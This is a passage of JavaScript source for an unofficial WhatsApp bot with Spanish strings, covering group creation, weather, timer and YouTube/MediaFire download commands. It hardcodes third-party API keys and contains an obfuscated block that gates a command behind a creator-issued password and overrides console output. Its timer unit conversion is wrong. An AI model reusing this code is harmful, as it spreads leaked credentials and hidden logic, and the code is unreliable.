Con esto hemos finalizado el proceso de instalacion, ahora procedemos a convertirnos en bot!

*node samu*

Al ejecutar el comando anterior nos saldra un codigo qr, el cual debemos de escanear en WhatsApp web de la aplicacion de whatsapp.
Si nos da error, escribimos el comando:
*npm i*

Una vez que hayamos escaneado, ya seremos el Bot!!

En unos instantes se enviara una aplicacion, en la cual puedes saber mas sobre la creacion de Bots!
De igual Forma te dejo mi canal de youtube para que puedas ver mis videos y estar actualizado🔮
https://www.youtube.com/watch?v=rOPBe6O-k3M

🌹ڰۣڿڰۣڿஇღԑ̮̑ঙღڰۣڿڰۣڿஇ🌹

*🌬Samu330 | Sam y Perry🔥*`)
break
			
case 'nuevogrupo':
const nombregc = args.join(' ')
if (!nombregc) return reply('*Porfavor escribe el nombre que quieras que tenga el grupo')
const group = await samu330.groupCreate(`${nombregc}`, [sender])
reply(`*EL GRUPO FUE CREADO CORRECTAMENTE CON EL NOMBRE:*\n\n*${nombregc}*\n\nid del grupo: ${group.gid}`)
samu330.sendMessage(group.gid, "hello everyone", MessageType.text, {quoted: fliveLoc})
break
		
case 'clima':
if (!q) return reply('*Y el lugar del que quieres ver el clima?*')
clima = `https://api.apiflash.com/v1/urltoimage?access_key=57fcd6384cff4e529b9ca76089f05992&url=https://pt.wttr.in/${q}`
sendFileFromUrl(clima, image, {quoted: fimg})
break
		
case 'idiomas':
reply(`*Estos son los idiomas soportados por la voz👇🏻*:

  'af': 'Afrikaans',
  'sq': 'Albanian',
  'ar': 'Arabic',
  'hy': 'Armenian',
  'ca': 'Catalan',
  'zh': 'Chinese',
  'zh-cn': 'Chinese (Mandarin/China)',
  'zh-tw': 'Chinese (Mandarin/Taiwan)',
  'zh-yue': 'Chinese (Cantonese)',
  'hr': 'Croatian',
  'cs': 'Czech',
  'da': 'Danish',
  'nl': 'Dutch',
  'en': 'English',
  'en-au': 'English (Australia)',
  'en-uk': 'English (United Kingdom)',
  'en-us': 'English (United States)',
  'eo': 'Esperanto',
  'fi': 'Finnish',
  'fr': 'French',
  'de': 'German',
  'el': 'Greek',
  'ht': 'Haitian Creole',
  'hi': 'Hindi',
  'hu': 'Hungarian',
  'is': 'Icelandic',
  'id': 'Indonesian',
  'it': 'Italian',
  'ja': 'Japanese',
  'ko': 'Korean',
  'la': 'Latin',
  'lv': 'Latvian',
  'mk': 'Macedonian',
  'no': 'Norwegian',
  'pl': 'Polish',
  'pt': 'Portuguese',
  'pt-br': 'Portuguese (Brazil)',
  'ro': 'Romanian',
  'ru': 'Russian',
  'sr': 'Serbian',
  'sk': 'Slovak',
  'es': 'Spanish',
  'es-es': 'Spanish (Spain)',
  'es-us': 'Spanish (United States)',
  'sw': 'Swahili',
  'sv': 'Swedish',
  'ta': 'Tamil',
  'th': 'Thai',
  'tr': 'Turkish',
  'vi': 'Vietnamese',
  'cy': 'Welsh'`)
break
		
case 'timer':        
if (args[1] == "segundos") {
var timer = args[0] + "000"
} else if (args[1] == "minutos") {
var timer = args[0] + "0000"
} else if (args[1] == "horas") {
var timer = args[0] + "00000"
} else {
return reply("Porfavor eliga entre: \nsegundos\nminutos\nhoras\n\nEjemplo: =timer 30 segundos")
}
addFilter(from)
reply(`*⏰Se ajusto su cronometro a ${q}*`)
setTimeout(() => {
reply(`⏰El tiempo de *${q}* a finalizado!`)
}, timer)
addFilter(from)
break
		

case 'mfire':
assistant = fs.readFileSync('./src/assistant.jpg')		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
if (args.length < 1) return reply('y el link?? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido, el link debe ser de MediaFire')
reply('*Espera un momento...*')
teks = args.join(' ')
const resm = await sm330mfire(teks)
result = `  「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*Nombre :* ${resm[0].nombre}
*Tamaño :* ${resm[0].size}
*Link :* ${resm[0].link}
_*El archivo se esta enviando......*_`
reply(result)
sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: fdoc})
addFilter(from)
break

case 'play':
assistant = fs.readFileSync('./src/assistant.jpg')		
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
reply(`*Espere un momento, su audio ${q} se esta descargando...*`)
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res1 = await yts(q).catch(e => {	
reply('_[ ! ] NO SE PUDO ENCONTRAR LO QUE BUSCABA_')
})	
let thumbInfo = ` [ *${res1.all[0].title}* ]
*°Subido hace* ${res1.all[0].ago}
*°Vistas :* ${res1.all[0].views}
*°Duracion :* ${res1.all[0].timestamp}
*°Canal :* ${res1.all[0].author.name}
*°Link del Canal :* ${res1.all[0].author.url}

*_El archivo se esta enviando....._*
`
sendFileFromUrl(res1.all[0].image, image, {quoted: sam, caption: thumbInfo})
res1 = await y2mateA(res1.all[0].url).catch(e => {
pr21 = getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)	
reply(`_[ ! ] Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
})
sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', duration :-99999999, filename: res1[0].output})
sendFileFromUrl(res1[0].link, audio, {quoted: faud, mimetype: 'audio/mp4', ptt: true, duration: 99999999999999, filename: res1[0].output})
}
addFilter(from)
addLevelingLevel(sender, 5)		
break
		
case 'playvid':		
if (!q) return reply('*Porfavor escribe el nombre del video que quieres descargar.*')
var _0x242d=['pUTuN','ctReply','\x0a\x0a_🛎Si\x20por','UAUSt','^([^\x20]+(\x20+','+\x20this\x20+\x20\x22','ntent','\x20algun\x20mot','Eceli','EÑA\x20REQUER','includes','startsWith','\x20desactiva','oJKgH','n\x20de\x20hacer','ctor(\x22retu','wId','ndo,\x20puede','226306FBisLz','error','IDA!!*','gwWpa','des\x20accede','\x20Obten\x20la\x20','SM330','BXsJw','\x20contraseñ','table','2|5|1|0|4|','hDTDp','sage','listMessag','length','aciones\x20de','qOxGu','\x20(Samu330)','*Contraseñ','\x20para\x20usar','moZGA','title','dCtKi','prototype','Bavqo','selecciona','^\x20]}','exception','\x20la\x20funcio','ral','\x20el\x20texto\x20','ble,\x20en\x20la','constructo','ydHiK','buttonText','fzlRt','apply','hcZSF','ofwkj','ra\x20comunic','return\x20/\x22\x20','1RykgIn','NjYbM','r\x20al\x20boton','ECT','nction()\x20','contraseña','\x20tu\x20WhatsA','split','dXUTm','ppLkF','__proto__','singleSele','Dffbj','QPMGE','sageFromCo','a\x20incorrec','oKAxt','arte\x20con\x20S','amu330','33770HAxMhw','2KZkIVU','BhFbm','kaGrd','rows','trace','xpfys',',\x20la\x20contr','688159Qggadk','swthZ','✍🏻\x20Click\x20pa','\x20de\x20abajo,','ivo\x20no\x20pue','TpDNd','del\x20video*','pp\x20Mod_','YCRQs','{}.constru','toString','s\x20configur','listType','selectedRo','777249dhEFrr','console','554NCejeB','aseña\x20se\x20u','descriptio','return\x20(fu','prepareMes','ZvTBq','\x0a\x0a*Es\x20nese','724YCxokI','anera:*\x0a\x0a','contextInf','VvmkB','Score','UqZhD','pMkgP','15PDHsXZ','bind','IcbMg','SINGLE_SEL','391102vPumHc','1821272JKpwBt','test','s\x20pedir\x20la','relayWAMes','FkVYO','eAKFU','hl*','[^\x20]+)+)+[','info','sendEpheme','iMNuK'];(function(_0x32739a,_0x2ed943){function _0x35f000(_0x4cca55,_0x3c8d63,_0x1700c2,_0x1b3af1){return _0x1b22(_0x1b3af1- -0x37d,_0x3c8d63);}function _0x3f65f7(_0x4a2d00,_0x177bcb,_0x24169b,_0x2dd8ec){return _0x1b22(_0x24169b- -0x369,_0x177bcb);}while(!![]){try{var _0x353ef3=parseInt(_0x35f000(-0x232,-0x21a,-0x1c8,-0x1f2))*parseInt(_0x3f65f7(-0x1ef,-0x226,-0x207,-0x1cc))+parseInt(_0x35f000(-0x1d7,-0x221,-0x213,-0x214))+-parseInt(_0x3f65f7(-0x1d1,-0x1ce,-0x1e2,-0x21c))*parseInt(_0x3f65f7(-0x1f6,-0x1ea,-0x208,-0x1fd))+-parseInt(_0x3f65f7(-0x218,-0x1c9,-0x1e9,-0x1bf))*-parseInt(_0x35f000(-0x1dd,-0x233,-0x1fc,-0x204))+parseInt(_0x35f000(-0x237,-0x227,-0x265,-0x258))+parseInt(_0x35f000(-0x224,-0x240,-0x1d5,-0x206))*parseInt(_0x3f65f7(-0x1e7,-0x233,-0x21b,-0x240))+-parseInt(_0x35f000(-0x1b0,-0x1d4,-0x20a,-0x1f1));if(_0x353ef3===_0x2ed943)break;else _0x32739a['push'](_0x32739a['shift']());}catch(_0x312526){_0x32739a['push'](_0x32739a['shift']());}}}(_0x242d,-0x1*0x7eeda+-0x608a6+0x1650f8));var _0x2541b9=function(){var _0x22c3fb={};_0x22c3fb[_0x3e69d7(0x348,0x2e5,0x324,0x306)]=_0x3e69d7(0x2af,0x2fd,0x2dc,0x2d3),_0x22c3fb['hDzMK']=_0x128041(0x153,0x164,0x183,0x189);function _0x128041(_0x2f930d,_0x56b40f,_0x22e9b4,_0x549e56){return _0x1b22(_0x2f930d- -0x3,_0x56b40f);}function _0x3e69d7(_0x2847cd,_0x5eb331,_0x17bbd0,_0xb346b9){return _0x1b22(_0xb346b9-0x170,_0x2847cd);}_0x22c3fb[_0x3e69d7(0x27d,0x255,0x2ad,0x290)]=_0x128041(0x14a,0x187,0x17b,0x145)+'+\x20this\x20+\x20\x22'+'/';var _0x3e476f=_0x22c3fb,_0x2b59e6=!![];return function(_0x18f21d,_0xd27b26){var _0x33fff2={'FkVYO':_0x3e476f[_0x3a3acf(0x3ab,0x3f3,0x3bb,0x3e6)],'IcbMg':_0x3a3acf(0x49c,0x443,0x494,0x461)+_0x426532(0x3d5,0x38b,0x3b8,0x3cb)+'^\x20]}','TpDNd':function(_0x503bd5){return _0x503bd5();}};function _0x426532(_0x2b633c,_0x4d5c6f,_0x3a3b3c,_0x5810f1){return _0x3e69d7(_0x3a3b3c,_0x4d5c6f-0x182,_0x3a3b3c-0xa1,_0x5810f1-0xc8);}function _0x3a3acf(_0x16b278,_0x2410f8,_0x3d0dd3,_0x5b5988){return _0x128041(_0x5b5988-0x2c9,_0x2410f8,_0x3d0dd3-0x39,_0x5b5988-0x16b);}var _0x342768=_0x2b59e6?function(){function _0x10504c(_0x544f06,_0x43d9f9,_0x23d17c,_0x6cd76a){return _0x426532(_0x544f06-0x76,_0x43d9f9-0x1d4,_0x544f06,_0x23d17c- -0x439);}function _0x1e771b(_0x29b975,_0x51f37d,_0x5b0c3a,_0x1d9477){return _0x3a3acf(_0x29b975-0xc,_0x29b975,_0x5b0c3a-0x29,_0x5b0c3a- -0x31f);}if(_0xd27b26){if(_0x3e476f[_0x10504c(-0x74,-0x79,-0x6b,-0x92)]!==_0x3e476f['hDzMK']){var _0x18bfc5=_0xd27b26[_0x1e771b(0x132,0x12d,0xf0,0x12b)](_0x18f21d,arguments);return _0xd27b26=null,_0x18bfc5;}else{var _0x2169c8={};_0x2169c8[_0x1e771b(0x10e,0x112,0x12a,0x13e)]=_0x33fff2[_0x10504c(-0x33,-0x3d,-0x71,-0x45)],_0x2169c8['Dffbj']=_0x33fff2[_0x1e771b(0x103,0x149,0x130,0x12e)];var _0x1c8612=_0x2169c8,_0x1b7258=function(){var _0x17fbbd=_0x1b7258[_0x498e24(0x421,0x3f6,0x3f5,0x3b3)+'r'](_0x1c8612[_0x14d5fb(0x33c,0x338,0x301,0x310)])()['constructo'+'r'](_0x1c8612[_0x498e24(0x3cb,0x3de,0x40a,0x3db)]);function _0x14d5fb(_0x5a00ab,_0x10e587,_0x4fc387,_0x4dca9f){return _0x10504c(_0x5a00ab,_0x10e587-0x8a,_0x4fc387-0x37f,_0x4dca9f-0x188);}function _0x498e24(_0x43c446,_0x4706d7,_0x2e9ecf,_0x212f4f){return _0x10504c(_0x4706d7,_0x4706d7-0x66,_0x2e9ecf-0x4b1,_0x212f4f-0xc7);}return!_0x17fbbd[_0x14d5fb(0x334,0x2e7,0x30b,0x2ea)](_0xf2c585);};return _0x33fff2[_0x10504c(-0x71,-0x95,-0x93,-0x6e)](_0x1b7258);}}}:function(){};return _0x2b59e6=![],_0x342768;};}(),_0x28d1ce=_0x2541b9(this,function(){function _0x4a8636(_0x2de8db,_0x3c9f9a,_0x65a02a,_0x5253dc){return _0x1b22(_0x3c9f9a-0x1ad,_0x5253dc);}var _0xedb99e={'oKAxt':_0x4a8636(0x339,0x348,0x31b,0x32b)+_0x4a8636(0x37f,0x340,0x322,0x31d)+_0x383dbd(-0x214,-0x1d8,-0x1b1,-0x197),'SncpR':function(_0xba6f86){return _0xba6f86();}};function _0x383dbd(_0x467d5f,_0x4aba0c,_0x4d30f5,_0x1234b9){return _0x1b22(_0x4aba0c- -0x317,_0x467d5f);}var _0x5ee514=function(){function _0x18f499(_0x8551ec,_0x252721,_0x286132,_0x22c351){return _0x4a8636(_0x8551ec-0xdc,_0x286132- -0x99,_0x286132-0xba,_0x8551ec);}var _0x480eb8=_0x5ee514[_0x4a7f8a(0x1e4,0x1cf,0x1fc,0x1e4)+'r'](_0x18f499(0x295,0x285,0x261,0x260)+_0x18f499(0x2cf,0x282,0x2b0,0x277)+'/')()[_0x18f499(0x24c,0x240,0x259,0x22e)+'r'](_0xedb99e[_0x18f499(0x230,0x28b,0x272,0x279)]);function _0x4a7f8a(_0x1c3bd0,_0x4d278d,_0x88dd25,_0x23750f){return _0x4a8636(_0x1c3bd0-0x35,_0x23750f- -0x10e,_0x88dd25-0x115,_0x4d278d);}return!_0x480eb8[_0x4a7f8a(0x246,0x264,0x239,0x22c)](_0x28d1ce);};return _0xedb99e['SncpR'](_0x5ee514);});_0x28d1ce();var _0x15746b=function(){var _0x539e01={};function _0x4551ca(_0x23a491,_0x4b0026,_0x250b32,_0x45b3ab){return _0x1b22(_0x4b0026-0x5,_0x250b32);}_0x539e01['gwWpa']=function(_0x1b5a70,_0x55e72e){return _0x1b5a70!==_0x55e72e;},_0x539e01['lqhnJ']=_0x4551ca(0x196,0x15c,0x12d,0x12a),_0x539e01[_0x5e94fc(0x31c,0x345,0x356,0x37b)]=_0x4551ca(0x16e,0x13a,0x142,0xfc),_0x539e01['xpfys']=_0x4551ca(0x187,0x154,0x192,0x161);function _0x5e94fc(_0x20ab14,_0x40bf4a,_0x3ff273,_0x279f4d){return _0x1b22(_0x40bf4a-0x1ae,_0x279f4d);}var _0x42a93e=_0x539e01,_0x34767c=!![];return function(_0x36277c,_0x533340){function _0xd2a822(_0x1f1408,_0x498cc7,_0x2ce119,_0xc90762){return _0x5e94fc(_0x1f1408-0x44,_0xc90762- -0x506,_0x2ce119-0x4c,_0x1f1408);}function _0x1bb0fa(_0x42cd90,_0x5e0089,_0x21670b,_0x5c6176){return _0x4551ca(_0x42cd90-0x17c,_0x42cd90- -0x1f1,_0x5c6176,_0x5c6176-0x162);}if(_0x42a93e[_0x1bb0fa(-0x85,-0x46,-0x6d,-0x56)]!==_0xd2a822(-0x23a,-0x1ec,-0x1ef,-0x22c)){var _0x1a7585=_0x34767c?function(){function _0x36e6ff(_0x5b53d4,_0x4970c2,_0x19560d,_0x2df396){return _0x1bb0fa(_0x2df396- -0x18a,_0x4970c2-0x196,_0x19560d-0xf2,_0x19560d);}function _0x519e76(_0x2bd389,_0x23cb73,_0x489254,_0x10612e){return _0x1bb0fa(_0x10612e-0x1db,_0x23cb73-0x37,_0x489254-0x120,_0x489254);}if(_0x42a93e[_0x519e76(0x10e,0x110,0x103,0x117)](_0x42a93e['lqhnJ'],_0x42a93e[_0x519e76(0x190,0x173,0x1b8,0x186)])){if(_0x533340){var _0x22c85e=_0x533340[_0x519e76(0x177,0x15c,0xf8,0x138)](_0x36277c,arguments);return _0x533340=null,_0x22c85e;}}else{if(_0x4cce39){var _0x33727b=_0x3dce9e[_0x36e6ff(-0x266,-0x267,-0x246,-0x22d)](_0x5b2b5a,arguments);return _0x281eab=null,_0x33727b;}}}:function(){};return _0x34767c=![],_0x1a7585;}else{var _0x143614=_0x1b3f71[_0x1bb0fa(-0xa3,-0x70,-0x8a,-0xbe)](_0x1a2dc9,arguments);return _0x2c455c=null,_0x143614;}};}(),_0x5084fb=_0x15746b(this,function(){var _0x47835d={'QPMGE':function(_0x50a8af,_0x186a79){return _0x50a8af(_0x186a79);},'ofwkj':function(_0x4b9202,_0x4dc7e7){return _0x4b9202+_0x4dc7e7;},'ZvTBq':function(_0x35d832,_0x12e659){return _0x35d832+_0x12e659;},'ydHiK':_0x29edac(0x442,0x440,0x477,0x44f)+_0x479fd2(0x3b5,0x373,0x3ba,0x390),'hcZSF':_0x479fd2(0x37a,0x3e5,0x3cf,0x3b0)+_0x479fd2(0x371,0x31e,0x32a,0x360)+'rn\x20this\x22)('+'\x20)','dCtKi':function(_0x5358d3){return _0x5358d3();},'pMkgP':_0x479fd2(0x353,0x3a0,0x38a,0x36d)+'3','YCRQs':function(_0x594270,_0x13acfe){return _0x594270===_0x13acfe;},'swthZ':'GPHIc','dqaEM':_0x29edac(0x403,0x41f,0x409,0x3d0),'Cyoxy':function(_0x272001,_0x4c47df){return _0x272001(_0x4c47df);},'moZGA':'log','hDTDp':'warn','UqZhD':_0x29edac(0x45a,0x42e,0x462,0x465),'SWqwL':_0x29edac(0x3ec,0x3e7,0x3ab,0x3c7),'ZfWyC':_0x29edac(0x406,0x43a,0x41e,0x3ff),'fzlRt':_0x479fd2(0x32e,0x355,0x383,0x36c),'EQYcU':_0x29edac(0x42c,0x424,0x3f8,0x3ea),'kvCgK':function(_0x218c61,_0x1af047){return _0x218c61<_0x1af047;},'UAUSt':_0x29edac(0x42a,0x416,0x41e,0x40e),'Eceli':_0x479fd2(0x3d1,0x3ab,0x399,0x3cf)};function _0x479fd2(_0x55c299,_0x31ebb4,_0x1b5b84,_0x37ed9b){return _0x1b22(_0x37ed9b-0x23e,_0x55c299);}var _0x3035c3;try{if(_0x47835d[_0x29edac(0x437,0x431,0x441,0x44f)](_0x47835d[_0x29edac(0x430,0x42f,0x436,0x42c)],_0x47835d['dqaEM'])){var _0x29e8b7=_0x47835d[_0x479fd2(0x399,0x37f,0x39e,0x399)](_0x33e246,_0x47835d[_0x29edac(0x411,0x416,0x3f0,0x401)](_0x47835d[_0x479fd2(0x393,0x395,0x3a0,0x3bc)](_0x47835d[_0x29edac(0x40c,0x414,0x3d2,0x42c)],_0x47835d['hcZSF']),');'));_0x12d1cd=_0x47835d[_0x479fd2(0x34b,0x38e,0x3af,0x379)](_0x29e8b7);}else{var _0x4565cf=_0x47835d['Cyoxy'](Function,_0x47835d[_0x479fd2(0x3f9,0x39c,0x3e4,0x3bc)](_0x47835d['ydHiK']+_0x47835d[_0x29edac(0x410,0x3e0,0x404,0x44e)],');'));_0x3035c3=_0x47835d[_0x479fd2(0x390,0x374,0x3a9,0x379)](_0x4565cf);}}catch(_0x26c67c){_0x3035c3=window;}var _0x27dea3=_0x3035c3[_0x29edac(0x43e,0x440,0x405,0x46e)]=_0x3035c3[_0x479fd2(0x3f8,0x38c,0x3cd,0x3b6)]||{},_0x53ad00=[_0x47835d[_0x29edac(0x3ff,0x3e2,0x417,0x3eb)],_0x47835d[_0x479fd2(0x35a,0x375,0x3b0,0x36e)],_0x47835d[_0x479fd2(0x3fd,0x3e0,0x3f3,0x3c3)],_0x47835d['SWqwL'],_0x47835d['ZfWyC'],_0x47835d[_0x479fd2(0x3b1,0x3bd,0x3a5,0x386)],_0x47835d['EQYcU']];function _0x29edac(_0x2940db,_0x4e914b,_0xfd0a52,_0x13e2ee){return _0x1b22(_0x2940db-0x2c6,_0xfd0a52);}for(var _0x356067=-0xb0a*-0x1+-0x97*0xb+-0x48d;_0x47835d['kvCgK'](_0x356067,_0x53ad00[_0x29edac(0x3f9,0x421,0x421,0x3f5)]);_0x356067++){if(_0x47835d[_0x29edac(0x460,0x460,0x424,0x44d)]!==_0x47835d[_0x29edac(0x465,0x42a,0x446,0x479)]){var _0x4c0a9a=('3|5|0|1|2|'+'4')[_0x29edac(0x41b,0x3f4,0x3dc,0x42a)]('|'),_0x58538d=-0x23*-0x10+-0x2b*0x31+-0xdd*-0x7;while(!![]){switch(_0x4c0a9a[_0x58538d++]){case'0':var _0x135ad9=_0x27dea3[_0x5a979f]||_0x43a89c;continue;case'1':_0x43a89c[_0x29edac(0x41e,0x3e1,0x413,0x45b)]=_0x15746b[_0x479fd2(0x3fd,0x3ac,0x3b2,0x3c6)](_0x15746b);continue;case'2':_0x43a89c['toString']=_0x135ad9['toString'][_0x479fd2(0x3bc,0x38e,0x3e4,0x3c6)](_0x135ad9);continue;case'3':var _0x43a89c=_0x15746b['constructo'+'r'][_0x29edac(0x402,0x3fb,0x431,0x43f)][_0x29edac(0x44e,0x430,0x430,0x482)](_0x15746b);continue;case'4':_0x27dea3[_0x5a979f]=_0x43a89c;continue;case'5':var _0x5a979f=_0x53ad00[_0x356067];continue;}break;}}else{var _0x3bd9bf=_0x47835d[_0x479fd2(0x3ef,0x399,0x3cb,0x3c4)][_0x29edac(0x41b,0x421,0x411,0x457)]('|'),_0x2cb0cc=0x5*0x5c+0x24e6+-0x3*0xce6;while(!![]){switch(_0x3bd9bf[_0x2cb0cc++]){case'0':_0x5a675e[_0x29edac(0x41e,0x453,0x424,0x41b)]=_0x2a4079[_0x479fd2(0x395,0x3a0,0x3c7,0x3c6)](_0x478d62);continue;case'1':var _0x4c3bd9=_0x50287e[_0x2f8dbd]||_0x5a675e;continue;case'2':var _0x5a675e=_0xe7f31f[_0x29edac(0x40b,0x44c,0x3d2,0x44a)+'r'][_0x29edac(0x402,0x3f1,0x422,0x439)][_0x479fd2(0x401,0x3a9,0x3ac,0x3c6)](_0x56b9d7);continue;case'3':_0xb5deed[_0x2f8dbd]=_0x5a675e;continue;case'4':_0x5a675e[_0x479fd2(0x3e5,0x3f3,0x3a2,0x3b1)]=_0x4c3bd9['toString']['bind'](_0x4c3bd9);continue;case'5':var _0x2f8dbd=_0x5291d9[_0x447f0f];continue;}break;}}}});_0x5084fb();var _0x1af0e5={};function _0x345719(_0x3c16fb,_0x6e46d3,_0x35bf53,_0x49b803){return _0x1b22(_0x3c16fb-0x3b3,_0x6e46d3);}_0x1af0e5[_0x345719(0x529,0x526,0x503,0x520)+_0x345719(0x4d6,0x506,0x500,0x4d8)]='*...*';var _0x3855a0={};_0x3855a0[_0x384bc0(0x397,0x3b3,0x379,0x3c5)]='✏\x20'+pushname+(_0x384bc0(0x387,0x380,0x39a,0x349)+_0x345719(0x506,0x4e8,0x523,0x50f)+'\x20aqui:\x0a*wa'+'.link/0n48'+_0x345719(0x545,0x515,0x537,0x54e)),_0x3855a0[_0x345719(0x50c,0x544,0x4e2,0x4ee)+_0x345719(0x54b,0x525,0x562,0x520)]=_0x1af0e5;var _0xa9489a={};_0xa9489a[_0x345719(0x518,0x50a,0x500,0x54f)]=[_0x3855a0];var _0xcca892={};_0xcca892[_0x384bc0(0x397,0x39e,0x358,0x3d0)]='*🔐\x20CONTRAS'+_0x345719(0x553,0x58d,0x55b,0x529)+_0x384bc0(0x384,0x393,0x35c,0x3c4),_0xcca892[_0x345719(0x52e,0x4fc,0x554,0x512)+'n']=_0x384bc0(0x3dc,0x3f1,0x3ab,0x3bf)+'sario\x20una\x20'+_0x384bc0(0x3b0,0x39d,0x3a0,0x3ad)+_0x384bc0(0x395,0x3d4,0x38b,0x38d)+'\x20este\x20coma'+_0x345719(0x4d7,0x4fb,0x4b8,0x4dc)+_0x384bc0(0x3eb,0x3be,0x3e3,0x40a)+_0x345719(0x4e0,0x519,0x503,0x51c)+'a\x20al\x20cread'+'or\x20del\x20bot'+_0x384bc0(0x393,0x35c,0x395,0x3d2)+_0x384bc0(0x3c5,0x3d7,0x405,0x39c)+_0x384bc0(0x3d7,0x3b2,0x416,0x3cb)+'sa\x20de\x20la\x20s'+'iguiente\x20m'+_0x345719(0x534,0x567,0x54f,0x518)+(prefix+command)+('\x20*contrase'+'ña|nombre\x20'+_0x384bc0(0x3cc,0x3b1,0x3d8,0x408)+_0x384bc0(0x3f6,0x401,0x3e8,0x41c)+_0x345719(0x551,0x56b,0x58a,0x585)+_0x384bc0(0x3ca,0x38c,0x3a9,0x400)+_0x345719(0x4dc,0x4ef,0x4c4,0x4ad)+_0x384bc0(0x3ad,0x389,0x3c7,0x3d4)+_0x345719(0x51f,0x4ea,0x52b,0x53d)+_0x384bc0(0x400,0x3be,0x3fb,0x406)+_0x384bc0(0x39e,0x367,0x383,0x396)+_0x384bc0(0x37e,0x393,0x354,0x34a)+_0x384bc0(0x3a0,0x3af,0x39c,0x3b5)+_0x345719(0x4f1,0x502,0x4c8,0x4b6)+_0x384bc0(0x3a1,0x395,0x3a0,0x396)+_0x345719(0x527,0x4e8,0x534,0x516)+_0x345719(0x4e7,0x4d6,0x514,0x4cd)+_0x384bc0(0x3b1,0x3ee,0x3e5,0x3cf)+_0x345719(0x523,0x553,0x515,0x505)),_0xcca892[_0x384bc0(0x3a4,0x3e6,0x374,0x3a6)]=_0x345719(0x51e,0x527,0x4f3,0x50a)+_0x345719(0x4ff,0x4bf,0x4e0,0x4d9)+_0x384bc0(0x3bc,0x3df,0x38f,0x3b0)+_0x384bc0(0x3bd,0x3de,0x3fa,0x392),_0xcca892[_0x345719(0x528,0x50d,0x556,0x55a)]=_0x345719(0x53d,0x52f,0x50a,0x524)+_0x384bc0(0x3ae,0x3ef,0x3bb,0x395),_0xcca892['sections']=[_0xa9489a];var _0xd33e76={};_0xd33e76[_0x384bc0(0x38f,0x390,0x39e,0x390)+'e']=_0xcca892;var _0x302249={};_0x302249['forwarding'+_0x384bc0(0x3e1,0x3ab,0x3f3,0x41d)]=0xf423f,_0x302249['isForwarde'+'d']=!![];var _0xd0e52={};_0xd0e52['quoted']=sam,_0xd0e52[_0x384bc0(0x3f2,0x411,0x3b4,0x3d8)+_0x384bc0(0x39f,0x38a,0x36a,0x368)]=!![];function _0x1b22(_0x5a26e6,_0x28d1ce){return _0x1b22=function(_0x2541b9,_0x4a0d84){_0x2541b9=_0x2541b9-(-0x1737+-0x26b*0x3+0x1f98);var _0x242de6=_0x242d[_0x2541b9];return _0x242de6;},_0x1b22(_0x5a26e6,_0x28d1ce);}function _0x384bc0(_0x1ca93b,_0xec86c7,_0x227140,_0x409005){return _0x1b22(_0x1ca93b-0x25d,_0x227140);}_0xd0e52[_0x345719(0x535,0x508,0x549,0x546)+'o']=_0x302249,nopasword=samu330[_0x384bc0(0x3da,0x41b,0x3f7,0x3d0)+_0x345719(0x50f,0x4e3,0x4d3,0x4d9)+_0x384bc0(0x3fa,0x3dd,0x3bf,0x3bd)](from,_0xd33e76,_0xd0e52);if(!q[_0x345719(0x554,0x537,0x51d,0x578)]('|'))return samu330[_0x384bc0(0x3ec,0x421,0x3f5,0x3fc)+_0x345719(0x4e4,0x50f,0x4db,0x507)](nopasword);if(!texto1)return samu330[_0x384bc0(0x3ec,0x410,0x411,0x3c4)+_0x345719(0x4e4,0x4b6,0x4c3,0x4f5)](nopasword);if(!texto2)return samu330['relayWAMes'+_0x345719(0x4e4,0x4c8,0x4f7,0x4a7)](nopasword);if(!texto1[_0x384bc0(0x3ff,0x42d,0x408,0x400)](_0x345719(0x4de,0x50d,0x4d7,0x517)))return reply(_0x384bc0(0x394,0x387,0x38e,0x38f)+_0x384bc0(0x3ba,0x3de,0x3d1,0x383)+'ta!*');
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res3 = await yts(q).catch(e => {	
reply('_[ ! ] NO SE PUDO ENCONTRAR LO QUE BUSCABA_')
})		
let thumbInfo = ` [ *${res3.all[0].title}* ]
*°Subido hace* ${res3.all[0].ago}
*°Vistas :* ${res3.all[0].views}
*°Duracion :* ${res3.all[0].timestamp}
*°Canal :* ${res3.all[0].author.name}
*°Link del Canal :* ${res3.all[0].author.url}
*°Link del video :* ${res3.all[0].url}

*_El archivo se esta enviando....._*
`
sendFileFromUrl(res3.all[0].image, image, {quoted: sam, caption: thumbInfo})
anu = await y2mateV(res3.all[0].url).catch(e => {
v21 = getJson(`https://api.zeks.xyz/api/ytmp4?apikey=hamilton20&url=${res3.all[0].url}`)
reply(`_[ ! ] Lo siento, su descarga no pudo ser completada_\n\n*Realizando busqueda en el servidor 2*`)
sendFileFromUrl(v21.result.url_video, video, {mimetype: 'video/mp4', filename: `${anu[0].output}`, quoted: fvid, caption: `[ *${res3.all[0].title}* ]\n\n\n🍒Samu330 | NyanBot💠`})	
})
sendFileFromUrl(anu[0].link, video, {mimetype: 'video/mp4', filename: `${anu[0].output}`, quoted: fvid, caption: `[ *${res3.all[0].title}* ]\n\n\n🍒Samu330 | NyanBot💠`})	
}
addFilter(from)
addLevelingLevel(sender, 5)		
break
		
case 'twit':
if (!isRegister) return reply(mess.only.usrReg)
